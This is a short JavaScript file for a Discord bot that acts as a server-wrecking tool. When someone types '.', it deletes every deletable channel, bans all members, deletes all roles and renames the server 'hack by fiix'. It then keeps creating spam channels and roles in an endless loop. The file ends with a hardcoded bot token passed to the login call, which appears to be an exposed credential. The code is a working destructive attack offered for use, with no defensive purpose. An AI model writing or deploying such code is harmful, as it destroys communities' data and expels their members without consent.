const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("hack by fiix");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("hack by fiix", "text");///////bo channel 
        message.guild.createChannel("HACK BY FIIX", "voice");////bo voice
        message.guild.createRole({ name: "hack by fiix" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODY4OTI3MjU1MjE5NDE3MTI5.YP2xkQ.mSB73evX7YKygBaUMwjXEdqDYPE")
